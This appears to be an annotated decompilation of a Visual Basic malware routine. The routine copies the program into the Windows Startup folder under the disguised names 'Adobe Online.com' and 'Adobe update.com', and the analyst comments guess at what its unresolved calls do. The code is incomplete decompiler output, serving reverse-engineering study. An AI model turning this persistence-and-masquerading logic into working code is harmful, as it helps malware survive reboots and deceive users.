' Drops the 2 copies of itself
Public Function funct10() '40417C
  'Data Table: 401838
  ' Define variables
  Dim original_name As Variant
  Dim copy1_name As Variant
  Dim var_140 As String
  Dim var_11C As String
  Dim remaining_copy As Double

  loc_404066: On Error Goto loc_40416F ' Exit on error

  loc_404082: startup_path = funct1(0) & "\" ' Get the Startup folder path
  loc_4040A2: ao_path = startup_path & "Adobe Online" & ".com" 'Variant. Name of the first copy
  loc_4040BE: au_path = startup_path & "Adobe update" & ".com" 'Variant. Name of the second copy
  loc_4040D1: var_118 = Me.Global.App

  loc_4040E1: original_name = CVar(App.EXEName) 'String
  loc_4040E7: Thumbs   .db.address_80000210
  loc_4040F4: copy1_name = "Adobe Online"
  loc_4040FD: Thumbs   .db.address_80000210
  
  ' Copy itself to the given path ?
  loc_404115: If (var_12C = var_12C) Then
  loc_40411B:   var_140 = CStr(au_path) ' Maybe an arg?
  loc_404122:   var_11C = CStr(ao_path) ' Maybe an arg?
                ' The files must be created and copied to the location,
                ' so its probable that this 2 calls are responsible
                ' for the file system operations
  loc_404126:   Thumbs   .db.address_80000240
  loc_40413A:   Thumbs   .db.address_80000258
  loc_40413F:   remaining_copy = au_path
  loc_404145: Else ' Do the same as above, but return different app paths
  loc_404148:   var_140 = CStr(ao_path)
  loc_40414F:   var_11C = CStr(au_path)
  loc_404153:   Thumbs   .db.address_80000240
  loc_404167:   Thumbs   .db.address_80000258
  loc_40416C:   remaining_copy = ao_path
  loc_40416F: End If

  loc_40416F: ' Referenced from: 404066
  loc_40416F: funct10 = remaining_copy
  loc_404175: funct10 = 2 ' Return 2
End Function